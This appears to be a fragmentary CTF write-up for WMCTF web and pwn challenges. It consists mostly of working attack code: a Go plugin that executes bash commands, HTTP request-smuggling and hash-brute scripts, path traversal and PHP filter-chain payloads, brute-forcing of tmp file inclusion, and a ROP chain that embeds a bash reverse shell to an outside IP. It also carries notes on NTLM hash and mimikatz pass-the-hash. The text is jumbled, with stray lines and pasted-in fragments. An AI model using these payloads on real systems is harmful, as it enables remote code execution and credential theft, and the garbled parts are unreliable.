Make PHP Great Again
gogogo
go build -buildmode=plugin plug.go
package main
import (
  "os/exec"
  "strings"
)
func Read(test string) ([]byte, error) {
  return nil, nil
}
func Req(command string) ([]byte, error) {
  var true_command string
  if strings.Contains(command,"n1ctfn1ctf") {
       true_command = strings.Replace(command, "n1ctfn1ctf", "", -1)
  } else {
         true_command = "dashabichutiren"
    }
    res, err := exec.Command("bash","-c",true_command).CombinedOutput()
  return res, err 
import requests
import collections
import os
from hashlib import md5
cookies = {
    "o" : 
"MTU5NjM4NTQ1OHxEdi1CQkFFQ180SUFBUkFCRUFBQVFfLUNBQUlHYzNSeWFXNW5EQWNBQlhWdVlXM
WxCbk4wY21sdVp3d0hBQVZoWkcxcGJnWnpkSEpwYm1jTUJRQURhSE5vQm5OMGNtbHVad3dJQUFZM1k
yWXdaalE9fOef3_t4hTf1V6aKQdS6yC9TfLcyhKsKrAsH2st3ucWh"
}
def get_hash():
    burp0_url = "http://gogogo.wmctf1.wetolink.com:80/auth/login"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 
10.15; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": 
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-
Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, 
deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    a = requests.get(burp0_url, headers=burp0_headers,cookies=cookies).text
    b = a.split("md5(x + 'FLAG')[:6] == ")[1].split('&nbsp;')[0]
    return b
def brute_hash():
    h = get_hash()
    print("bruting hash: " +h)
    while True:
        nt = os.urandom(5)
        m = md5()
        m.update(nt + "FLAG")
        r = m.hexdigest()[:6]
        if r == h:
            print("found: " + nt)
            return nt 
def reg():
    hs = brute_hash()
    burp0_url = "http://gogogo.wmctf1.wetolink.com:80/auth/register"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 
10.15; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": 
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-
Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, 
deflate", "Referer": "http://gogogo.wmctf1.wetolink.com/auth/register", 
"Content-Type": "application/x-www-form-urlencoded", "Connection": "close", 
"Upgrade-Insecure-Requests": "1"}
    burp0_data = {"uname": "admin\x00", "pwd": "admin123", "email": 
"PI:EMAIL", "hsh": hs}
    print(requests.post(burp0_url, headers=burp0_headers, 
data=burp0_data,cookies=cookies).text)
def login():
    hs = brute_hash()
    burp0_url = "http://gogogo.wmctf1.wetolink.com:80/auth/login"
base64
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 
10.15; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": 
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-
Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, 
deflate", "Referer": "http://gogogo.wmctf1.wetolink.com/auth/login", "Content-
Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-
Insecure-Requests": "1"}
    burp0_data = {"uname": "admin\x00", "pwd": "admin123", "hsh": hs}
    print(requests.post(burp0_url, headers=burp0_headers, 
data=burp0_data,cookies=cookies).text)
url = "http://gogogo.wmctf1.wetolink.com/admin/invoke"
params = collections.OrderedDict([("plugin", 
('base.so',open('plug.so','r').read().encode('hex')))])
res = requests.post('http://n1ctf.com', files=params)
body = res.request.body
boundary = res.request.headers['Content-Type']
package='''POST /admin/upload HTTP/1.1
Host: 127.0.0.1
Cookie: o={}
Content-Type: {}
Content-Length: {}
Cache-Control: no-cache
{}
GET /admin/reload HTTP/1.1
Host: 127.0.0.1
Cookie: o={}
GET / 
HTTP/1.1'''.replace('\n','\r\n').format(cookies["o"],boundary,res.request.head
ers['Content-Length'] ,body,cookies["o"])
data = {
        'fn':'Req',
        'arg':'http://127.0.0.1/auth/login?a=1 HTTP/1.1\r\nHost: 
127.0.0.1\r\n\r\n'+package
}
c = requests.post(url, cookies=cookies, data=data)
print(c.content)
http://base.wmctf.wetolink.com/b64.php?filename=../../../../usr/lib/php/20170718/cfgoPHPExt_ne
w.so
gophpbase64decode
leak phpfork
from base64 import *
from pwn import *
import requests
tmp = '''
")
        except:
            continue
from base64 import *
from pwn import *
import requests
url = 'http://base.wmctf.wetolink.com/b64.php'
'''
bash -i >& /dev/tcp/192.168.174.128/9090 0>&1
'''
tmp = '''
& /dev/tcp/81.68.151.131/9090 
0>&1"+p64(0xc00007d8ac)+p64(0xc00007d8b6)+p64(0xc00007d8b9)).ljust(3*55-
1,'\x00')+p64(pop_rax)+p64(34)+p64(syscall)
  a = ("/bin/bash\x00-c\x00bash -i >& /dev/tcp/81.68.151.131/9090 
0>&1\x00\x00\x00\x00"+p64(mbase+0x8ac)+p64(mbase+0x8b6)+p64(mbase+0x8b9)).ljus
t(3*55-
1,'\x00')+p64(pop_rdi)+p64(mbase+0x8ac)+p64(pop_0)+p64(0)*2+p64(pop_rsi)+p64(m
base+0x8e8)+p64(pop_rax)+p64(59)+p64(syscall)#+"/bin/bash\x00-c\x00bash -i >& 
/dev/tcp/127.0.0.1/9090 0>&1"
  tmp = tmp.format(context=b64encode(a)+'==')
  data = {
  'text':b64encode(a)+'=='
  }
  r = requests.post(url,data=data,timeout=2)
  print r.status_code
  print r.text
Make PHP Great Again 2.0
web_checkin2
http://v2222.no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?
file=php://filter/convert.base64-
encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc
/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/
root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/roo
t/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc
/self/cwd/flag.php
POST /?
content=php://filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%2
8%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resourc
e=123.php HTTP/1.1
Host: web_checkin2.wmctf.wetolink.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) 
Gecko/20100101 Firefox/78.0§§
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----
WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Length: 187
------WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Disposition: form-data; name="file"; filename="123123"
------WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Disposition: form-data; name="file"; filename="123123"
------WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Disposition: form-data; name="file"; filename="123123"
------WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Disposition: form-data; name="file"; filename="123123"
------WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Disposition: form-data; name="file"; filename="123123"
------WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Disposition: form-data; name="file"; filename="123123"
------WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Disposition: form-data; name="file"; filename="123123"
------WebKitFormBoundary2rwkUEtFdqhGMHqV
# -*- coding: utf-8 -*-
import requests
import string
charset = string.digits + string.letters
host = "web_checkin2.wmctf.wetolink.com"
port = 80
base_url = "http://%s:%d" % (host, port)
def brute_force_tmp_files():
    for i in charset:
        for j in charset:
            for k in charset:
                for l in charset:
                    for m in charset:
                        for n in charset:
                            filename = i + j + k + l + m + n
                            url = "%s/index.php?content=/tmp/php%s" % (
                                base_url, filename)
                            print url
                            try:
                                response = requests.get(url)
                                if 'phpinfo' in response.content or 'WMCTF' in 
response.content:
                                    print(response.content)
                                    with open("/tmp/flag.txt","a+") as f:
                                        f.write(response.content)
                                    print "[+] Include success!"
                                    return True
http://web_checkin2.wmctf.wetolink.com/?content=/fffffllllllllaaaaaggggggg_as89c79as8
SimpleAuth
NetNtlmv1 hash
sqluser ntlm hash 9e8b5692b2507c3b917cf60a63b12bc3
mimikatz pthSSMSimpacketmssqlclient.py 
webweb
https://github.com/bcosca/fatfree
                            except Exception as e:
                                print e
    return False
def main():
    brute_force_tmp_files()